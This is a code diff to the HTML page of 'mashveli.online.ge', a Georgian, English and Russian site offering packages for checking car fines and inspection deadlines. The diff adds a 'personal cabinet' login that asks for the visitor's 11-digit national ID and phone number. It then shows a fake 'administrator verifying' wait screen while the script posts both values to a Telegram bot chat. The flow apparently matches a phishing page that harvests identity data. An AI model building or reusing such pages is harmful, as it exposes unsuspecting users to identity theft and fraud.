@@ -44,6 +44,32 @@
             font-size: 20px;
         }
 
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .login-nav-btn {
+            background-color: #d2f75a;
+            color: #1b382b;
+            font-size: 13px;
+            font-weight: 700;
+            padding: 8px 18px;
+            border-radius: 20px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .login-nav-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(210, 247, 90, 0.3);
+        }
+
         /* Language Switcher */
         .lang-switch {
             background: rgba(255, 255, 255, 0.1);
@@ -511,29 +537,13 @@
             margin-bottom: 25px;
         }
 
-        .welcome-subtitle-top {
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: #555;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .welcome-title {
-            font-size: 26px;
-            font-weight: 700;
-            color: #1b382b;
-            margin-bottom: 20px;
-        }
-
         .welcome-text {
             font-size: 14px;
             color: #444;
             line-height: 1.6;
         }
 
-        /* Tally Form Modal Styling */
+        /* Tally & Auth Form Modal Styling */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -578,6 +588,66 @@
             margin-bottom: 20px;
         }
 
+        /* Cabinet Form Styles */
+        .auth-form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .auth-form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1b382b;
+            margin-bottom: 5px;
+        }
+
+        .auth-form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .auth-form-group input:focus {
+            border-color: #1b382b;
+        }
+
+        .auth-submit-btn {
+            width: 100%;
+            background-color: #1b382b;
+            color: #ffffff;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .auth-submit-btn:hover {
+            background-color: #2b5743;
+        }
+
+        .waiting-box {
+            text-align: center;
+            padding: 30px 10px;
+        }
+
+        .spinner {
+            font-size: 36px;
+            margin-bottom: 15px;
+            display: inline-block;
+            animation: spin 2s infinite linear;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -587,17 +657,21 @@
             .hero-grid, .packages-grid, .services-grid, .security-box-wrapper {
                 grid-template-columns: 1fr;
             }
+            .header-flex {
+                flex-direction: column;
+                gap: 15px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <!-- Welcome Information Popup (Auto-opens on load, closed with X) -->
+    <!-- Welcome Information Popup -->
     <div id="welcomeModal" class="welcome-modal-overlay">
         <div class="welcome-modal-content">
             <button class="welcome-close-btn" onclick="closeWelcomeModal()">&times;</button>
             <div class="welcome-icon-box">🚗</div>
-            <p class="welcome-text">
+            <p class="welcome-text" data-key="welcomeText">
                 მოგესალმებით! კეთილი იყოს თქვენი მობრძანება mashveli.online.ge-ზე. ჩვენს პლატფორმაზე მარტივად შეძლებთ შეარჩიოთ თქვენთვის სასურველი პაკეტი, რომელიც დაგეხმარებათ ოპერატიულად შეამოწმოთ თქვენი ავტომობილის მიმდინარე ჯარიმები და ტექნიკური ინსპექტირების გავლის ვადები, აგრეთვე თქვენ დაგხვდებათ დამატებით მომსახურების სერვისი.
             </p>
         </div>
@@ -607,10 +681,15 @@
     <header class="site-header">
         <div class="container header-flex">
             <div class="logo">mashveli.online.ge</div>
-            <div class="lang-switch">
-                <span class="lang-btn active" onclick="changeLanguage('geo')">GEO</span>
-                <span class="lang-btn" onclick="changeLanguage('eng')">ENG</span>
-                <span class="lang-btn" onclick="changeLanguage('rus')">Русский</span>
+            <div class="header-right">
+                <button class="login-nav-btn" onclick="openAuthModal()">
+                    👤 <span data-key="loginBtn">პირადი კაბინეტი</span>
+                </button>
+                <div class="lang-switch">
+                    <span class="lang-btn active" onclick="changeLanguage('geo')">GEO</span>
+                    <span class="lang-btn" onclick="changeLanguage('eng')">ENG</span>
+                    <span class="lang-btn" onclick="changeLanguage('rus')">Русский</span>
+                </div>
             </div>
         </div>
     </header>
@@ -664,7 +743,7 @@
                     <span class="pkg-badge" data-key="pkg3Badge">საუკეთესო ღირებულება</span>
                     <div class="price">60 GEL</div>
                     <div class="duration" data-key="pkg3Dur">1 წელი</div>
-                    <p data-key="pkg3Desc">გრძელვადიანი მხარდაჭერა მთელი წლის განმავლობაში.</p>
+                    <p data-key="pkg3Desc">გრძელვადიანი მხარდაჭერა მთელი წლის განავლობაში.</p>
                     <button class="select-pkg-btn" data-key="selectBtn">არჩევა</button>
                 </div>
             </div>
@@ -771,11 +850,42 @@
         </div>
     </div>
 
+    <!-- AUTH / CABINET MODAL OVERLAY -->
+    <div id="authModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="close-modal" onclick="closeAuthModal()">&times;</button>
+            
+            <div id="authFormBox">
+                <div class="modal-header-text" data-key="authModalTitle">პირად კაბინეტში შესვლა</div>
+                <form onsubmit="handleAuthRequest(event)">
+                    <div class="auth-form-group">
+                        <label data-key="personalIdLabel">პირადი ნომერი (11-ნიშნა)</label>
+                        <input type="text" id="userPersonalIdInput" required maxlength="11" pattern="\d{11}" placeholder="010................">
+                    </div>
+                    <div class="auth-form-group">
+                        <label data-key="phoneLabel">ტელეფონის ნომერი</label>
+                        <input type="tel" id="userPhoneInput" required placeholder="599 00 00 00">
+                    </div>
+                    <button type="submit" class="auth-submit-btn" data-key="sendRequestBtn">მოთხოვნის გაგზავნა</button>
+                </form>
+            </div>
+
+            <!-- Waiting Screen -->
+            <div id="authWaitingBox" class="waiting-box" style="display: none;">
+                <div class="spinner">⏳</div>
+                <h3 style="color: #1b382b; margin-bottom: 10px;" data-key="waitingTitle">მოთხოვნა გაგზავნილია</h3>
+                <p style="font-size: 13px; color: #666;" data-key="waitingDesc">ადმინისტრატორი ამოწმებს თქვენს პაკეტს. დადასტურებისთანავე შეხვალთ კაბინეტში...</p>
+            </div>
+        </div>
+    </div>
+
     <!-- JavaScript for Translations & Modals -->
     <script>
         const translations = {
             geo: {
                 pageTitle: "მძღოლის ასისტენტი — mashveli.online.ge",
+                loginBtn: "პირადი კაბინეტი",
+                welcomeText: "მოგესალმებით! კეთილი იყოს თქვენი მობრძანება mashveli.online.ge-ზე. ჩვენს პლატფორმაზე მარტივად შეძლებთ შეარჩიოთ თქვენთვის სასურველი პაკეტი, რომელიც დაგეხმარებათ ოპერატიულად შეამოწმოთ თქვენი ავტომობილის მიმდინარე ჯარიმები და ტექნიკური ინსპექტირების გავლის ვადები, აგრეთვე თქვენ დაგხვდებათ დამატებით მომსახურების სერვისი.",
                 heroBadge: "ავტომობილის მხარდაჭერა ყოველდღე",
                 heroTitle: "მძღოლის ასისტენტი — მშვიდი გზა იწყება აქედან",
                 heroDesc: "მარტივი მხარდაჭერა მძღოლებისთვის: შეავსეთ მოთხოვნა, აირჩიეთ თქვენთვის სასურველი პაკეტი და გააგრძელეთ დაცულ საკომუნიკაციო არხში.",
@@ -792,7 +902,7 @@
                 pkg2Desc: "დაბალანსებული პაკეტი მუდმივი დახმარებისთვის.",
                 pkg3Badge: "საუკეთესო ღირებულება",
                 pkg3Dur: "1 წელი",
-                pkg3Desc: "გრძელვადიანი მხარდაჭერა მთელი წლის განმავლობაში.",
+                pkg3Desc: "გრძელვადიანი მხარდაჭერა მთელი წლის განავლობაში.",
                 selectBtn: "არჩევა",
                 additionalTitle: "თქვენ დამატებით შეგიძლიათ აირჩიოთ თქვენთვის სასურველი მომსახურების სერვისი",
                 serv1Title: "ევაკუატორი 24/7",
@@ -811,10 +921,18 @@
                 secCardDesc: "ფორმის მიღების შემდეგ ჩვენ გაგიხსნით გარე დაცულ საკომუნიკაციო და გადახდის არხს. საბანკო ბარათის მონაცემები ამ გვერდზე არ გროვდება.",
                 bannerText: "დაგვიკავშირდით WhatsApp-ზე",
                 footerText: "mashveli.online.ge — თქვენი გზის ყოველდღიური პარტნიორი",
-                modalSelectedPkg: "არჩეული პაკეტი"
+                modalSelectedPkg: "არჩეული პაკეტი",
+                authModalTitle: "პირად კაბინეტში შესვლა",
+                personalIdLabel: "პირადი ნომერი (11-ნიშნა)",
+                phoneLabel: "ტელეფონის ნომერი",
+                sendRequestBtn: "მოთხოვნის გაგზავნა",
+                waitingTitle: "მოთხოვნა გაგზავნილია",
+                waitingDesc: "ადმინისტრატორი ამოწმებს თქვენს პაკეტს. დადასტურებისთანავე შეხვალთ კაბინეტში..."
             },
             eng: {
                 pageTitle: "Driver Assistant — mashveli.online.ge",
+                loginBtn: "Personal Account",
+                welcomeText: "Welcome to mashveli.online.ge! On our platform you can easily select your desired package to quickly check current vehicle fines, technical inspection deadlines, and access additional support services.",
                 heroBadge: "Car Support Every Day",
                 heroTitle: "Driver Assistant — A Calm Journey Starts Here",
                 heroDesc: "Simple support for drivers: fill out a request, choose your preferred package, and proceed in a secure communication channel.",
@@ -850,10 +968,18 @@
                 secCardDesc: "Upon receiving the form, we will open an external secure communication and payment channel. Bank card details are not collected on this page.",
                 bannerText: "Contact Us on WhatsApp",
                 footerText: "mashveli.online.ge — Your Daily Road Partner",
-                modalSelectedPkg: "Selected package"
+                modalSelectedPkg: "Selected package",
+                authModalTitle: "Login to Personal Cabinet",
+                personalIdLabel: "Personal ID (11 digits)",
+                phoneLabel: "Phone Number",
+                sendRequestBtn: "Send Request",
+                waitingTitle: "Request Sent",
+                waitingDesc: "Administrator is verifying your subscription. You will enter upon approval..."
             },
             rus: {
                 pageTitle: "Помощник водителя — mashveli.online.ge",
+                loginBtn: "Личный кабинет",
+                welcomeText: "Добро пожаловать на mashveli.online.ge! На нашей платформе вы можете легко выбрать подходящий пакет, чтобы оперативно проверять текущие штрафы вашего автомобиля, сроки техосмотра и пользоваться доп. услугами.",
                 heroBadge: "Поддержка автомобиля каждый день",
                 heroTitle: "Помощник водителя — Спокойный путь начинается здесь",
                 heroDesc: "Простая поддержка для водителей: заполните заявку, выберите подходящий пакет и продолжайте в защищенном канале связи.",
@@ -889,7 +1015,13 @@
                 secCardDesc: "После получения формы мы откроем для вас внешний защищенный канал связи и оплаты. Данные банковских карт на этой странице не собираются.",
                 bannerText: "Свяжитесь с нами в WhatsApp",
                 footerText: "mashveli.online.ge — Ваш ежедневный партнер в дороге",
-                modalSelectedPkg: "Выбранный пакет"
+                modalSelectedPkg: "Выбранный пакет",
+                authModalTitle: "Вход в личный кабинет",
+                personalIdLabel: "Личный номер (11 цифр)",
+                phoneLabel: "Номер телефона",
+                sendRequestBtn: "Отправить запрос",
+                waitingTitle: "Запрос отправлен",
+                waitingDesc: "Администратор проверяет вашу подписку. Доступ откроется сразу после подтверждения..."
             }
         };
 
@@ -906,36 +1038,64 @@
                 }
             });
 
-            document.getElementById('pageTitle').innerText = translations[lang].pageTitle;
+            document.title = translations[lang].pageTitle;
         }
 
-        // Welcome Modal Functions
+        // Welcome Modal Handlers
         function closeWelcomeModal() {
             document.getElementById('welcomeModal').style.display = 'none';
         }
 
-        // Tally Form Modal Functions
-        function openModal(packageName) {
-            document.getElementById('selectedPkgName').innerText = packageName;
-            const tallyUrl = `https://tally.so/embed/0QWLKN?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1&package=${encodeURIComponent(packageName)}`;
-            document.getElementById('tallyIframe').src = tallyUrl;
+        // Tally Modal Handlers
+        function openModal(pkgName) {
+            document.getElementById('selectedPkgName').innerText = pkgName;
             document.getElementById('tallyModal').style.display = 'flex';
-            document.body.style.overflow = 'hidden';
         }
 
         function closeModal() {
             document.getElementById('tallyModal').style.display = 'none';
-            document.getElementById('tallyIframe').src = '';
-            document.body.style.overflow = 'auto';
         }
 
-        window.onclick = function(event) {
-            var tallyModal = document.getElementById('tallyModal');
-            if (event.target == tallyModal) {
-                closeModal();
+        // Cabinet Auth Modal Handlers
+        function openAuthModal() {
+            document.getElementById('authModal').style.display = 'flex';
+            document.getElementById('authFormBox').style.display = 'block';
+            document.getElementById('authWaitingBox').style.display = 'none';
+        }
+
+        function closeAuthModal() {
+            document.getElementById('authModal').style.display = 'none';
+        }
+
+        // Handle Access Request to Telegram
+        async function handleAuthRequest(e) {
+            e.preventDefault();
+            const pid = document.getElementById('userPersonalIdInput').value;
+            const phone = document.getElementById('userPhoneInput').value;
+
+            document.getElementById('authFormBox').style.display = 'none';
+            document.getElementById('authWaitingBox').style.display = 'block';
+
+            // Telegram Bot Request
+            const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+            const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+
+            const message = `🚨 *პირად კაბინეტში შესვლის მოთხოვნა!*\n\n🆔 პირადი ნომერი: \`${pid}\`\n📱 ტელეფონი: \`${phone}\`\n\nდაუშვა მომხმარებელი?`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.log("Telegram API Error:", err);
             }
         }
     </script>
-
 </body>
 </html>
